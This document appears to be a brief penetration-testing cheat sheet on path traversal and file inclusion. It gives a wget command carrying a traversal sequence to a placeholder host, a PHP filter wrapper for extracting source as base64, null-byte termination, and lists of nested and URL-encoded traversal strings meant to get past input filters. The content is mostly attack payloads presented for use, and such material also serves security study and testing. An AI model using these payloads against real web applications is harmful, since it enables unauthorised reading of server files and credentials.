## Wget

Sometimes browsers mess around with basic directory traversal sequences, but wget may work:

```
wget http://[host]/page.php?url=../../../../../../../file.html
```

## Tricks

 - PHP Filter b64 (php://filter/zlib.deflate/convert.base64-encode/resource=FILE)
 - Nullbyte ending (%00)
 - 403bypass section may help

## Bypasses

### Nesting traversal sequences

```
....//
....\/
..../\
....\\
```

### URL Encoding

```
dot             %2e
forward slash   %2f
backslash       %5c
```

### Double URL Encoding

```
dot             %252e
forward slash   %252f
backslash       %255c
```

### Null Byte

Some applications check whether the user-supplied file name ends in a particular file type or set of file types, and reject attempts to access anything else. A null byte terminator (%00 or 0x00 in hex) will stop processing immediately, so that any bytes following it are ignored.
